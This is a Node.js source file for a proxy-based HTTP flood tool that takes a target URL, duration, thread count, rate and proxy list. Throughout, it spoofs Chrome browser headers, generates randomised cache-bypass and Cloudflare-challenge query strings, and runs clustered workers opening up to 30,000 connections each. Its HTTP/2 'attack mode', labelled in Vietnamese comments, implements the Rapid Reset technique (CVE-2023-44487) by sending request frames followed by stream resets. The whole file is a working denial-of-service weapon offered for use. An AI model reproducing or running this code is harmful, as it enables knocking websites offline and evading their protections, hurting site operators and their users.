const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');


const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];


require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;


process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });


const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delay = 0;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheBypass = process.argv.includes('--cache');


if (!target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
      node ${process.argv[1]} <target> <time> <threads> <ratelimit> <proxy>
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
      --full - this new func for attack only big backend ex amazon akamai and other... support cf
      --http 1/2/mix - new func choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --cache - enable cache bypass/miss mode with random headers
    `);
    process.exit(1);
}

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

function getCacheBypassHeaders() {
    const strategies = [
        // =====================================================
        // ======================= MISS ========================
        // =====================================================

        {
            mode: 'MISS',
            headers: {
                'cache-control': 'max-age=0, must-revalidate'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'no-cache',
                'pragma': 'no-cache'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'no-cache'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'no-cache, must-revalidate'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'max-age=0',
                'expires': '0'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'max-age=0, must-revalidate',
                'pragma': 'no-cache',
                'expires': '0'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'no-cache',
                'cf-cache-control': 'no-cache'
            }
        },
        {
            mode: 'MISS',
            headers: {
                'cache-control': 'no-cache',
                'surrogate-control': 'max-age=0'
            }
        },

        // =====================================================
        // ====================== BYPASS ======================
        // =====================================================

        {
            mode: 'BYPASS',
            headers: {
                'cache-control': 'no-store, no-cache, must-revalidate, private',
                'pragma': 'no-cache',
                'expires': '0'
            }
        },
        {
            mode: 'BYPASS',
            headers: {
                'cache-control': 'no-store',
                'surrogate-control': 'no-store'
            }
        },
        {
            mode: 'BYPASS',
            headers: {
                'cache-control': 'no-store',
                'pragma': 'no-cache'
            }
        },

        // =====================================================
        // ======================= NONE ========================
        // =====================================================

        {
            mode: 'NONE',
            headers: {
                'cache-control': 'private, no-store'
            }
        },
        {
            mode: 'NONE',
            headers: {
                'cache-control': 'no-store',
                'pragma': 'no-cache',
                'expires': '0'
            }
        }
    ];

    const picked = strategies[Math.floor(Math.random() * strategies.length)];
    return picked.headers;
}


function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}


function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}


function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}


function encodeRstStream(streamId, errorCode = 0x08) {
    const frame = Buffer.alloc(13);
    frame.writeUInt32BE(4 << 8 | 3, 0);
    frame.writeUInt8(0, 4);
    frame.writeUInt32BE(streamId, 5);
    frame.writeUInt32BE(errorCode, 9);
    return frame;
}


function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}


function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


function buildRequest() {
    const browserVersion = getRandomInt(130, 142);

    let brandValue;
    if (browserVersion >= 130 && browserVersion <= 133) {
        brandValue = `"Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}", "Not?A_Brand";v="99"`;
    } else if (browserVersion >= 134 && browserVersion <= 137) {
        brandValue = `"Not)A;Brand";v="99", "Google Chrome";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    } else if (browserVersion >= 138 && browserVersion <= 142) {
        brandValue = `"Google Chrome";v="${browserVersion}", "Chromium";v="${browserVersion}", "Not-A.Brand";v="24"`;
    }

    const acceptHeaderValue = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const langValue = 'en-US,en;q=0.9';
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;

    let cachePath = url.pathname;
    if (cacheBypass && Math.random() < 0.5) {
        cachePath += (url.pathname.includes('?') ? '&' : '?') + 'v=' + Date.now();
    }

    let headers = `GET ${cachePath} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n`;

    if (cacheBypass) {
        const cacheHeaders = getCacheBypassHeaders();
        for (const [key, value] of Object.entries(cacheHeaders)) {
            headers += `${key.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join('-')}: ${value}\r\n`;
        }
    } else {
        headers += 'Cache-Control: max-age=0\r\n';
    }

    headers += 'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n\r\n';

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}


const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))


function go() {
    var [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                try {
                                    const decoded = hpack.decode(frame.payload);
                                    const statusHeader = decoded.find(x => x[0] == ':status');
                                    if (statusHeader && statusHeader[1]) {
                                        const status = statusHeader[1];
                                        if (!statuses[status])
                                            statuses[status] = 0;
                                        statuses[status]++;
                                    }
                                } catch (e) {}
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }
                                try {
                                    tlsSocket.write(encodeRstStream(0, 0x08));
                                } catch (e) {}
                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const requests = []
                    
                    let currentRate;
                    currentRate = process.argv[5];

                    for (let i = 0; i < (isFull ? currentRate : 1); i++) {
                        const browserVersion = getRandomInt(130, 142);

                        let brandValue;
                        if (browserVersion >= 130 && browserVersion <= 133) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\", \"Not?A_Brand\";v=\"99\"`;
                        } else if (browserVersion >= 134 && browserVersion <= 137) {
                            brandValue = `\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        } else if (browserVersion >= 138 && browserVersion <= 142) {
                            brandValue = `\"Google Chrome\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\", \"Not-A.Brand\";v=\"24\"`;
                        }

                        const acceptHeaderValue = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
                        const langValue = 'en-US,en;q=0.9';
                        var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                        const secChUa = `${brandValue}`;

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        let requestPath = query ? handleQuery(query) : url.pathname;
                        
                        if (cacheBypass && Math.random() < 0.5) {
                            requestPath += (requestPath.includes('?') ? '&' : '?') + 'v=' + Date.now();
                        }

                        const baseHeaders = {
                            ":method": "GET",
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": requestPath,
                        };

                        const mainHeaders = {
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": acceptHeaderValue,
                            "sec-fetch-site": "none",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                        };

                        if (cacheBypass) {
                            const cacheHeaders = getCacheBypassHeaders();
                            Object.assign(mainHeaders, cacheHeaders);
                        } else {
                            if (Math.random() < 0.4) {
                                mainHeaders["cache-control"] = "max-age=0";
                            }
                        }

                        const headers = Object.entries(baseHeaders).concat(
                            Object.entries(mainHeaders).filter(a => a[1] != null)
                        );

                        const combinedHeaders = headers;

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        // DEBUG MODE: Dùng 0x25 (END_STREAM) để nhận full response
                        // ATTACK MODE: Dùng 0x24 (không END_STREAM) + gửi RST_STREAM sau (Rapid Reset)
                        const frameFlags = debugMode ? 0x25 : 0x24;
                        requests.push(encodeFrame(streamId, 1, packed, frameFlags));
                        
                        // Rapid Reset Attack: Chỉ khi KHÔNG debug
                        if (!debugMode) {
                            const currentStreamId = streamId;
                            // Delay 10ms rồi gửi RST_STREAM (CVE-2023-44487)
                            setTimeout(() => {
                                try {
                                    if (!tlsSocket.destroyed) {
                                        tlsSocket.write(encodeRstStream(currentStreamId, 0x08));
                                    }
                                } catch (e) {}
                            }, 10);
                        }
                        
                        streamId += 2
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, isFull ? 1000 : 1000 / currentRate)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                try {
                    tlsSocket.destroy()
                } catch (e) {}
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads * 2 }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Start`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}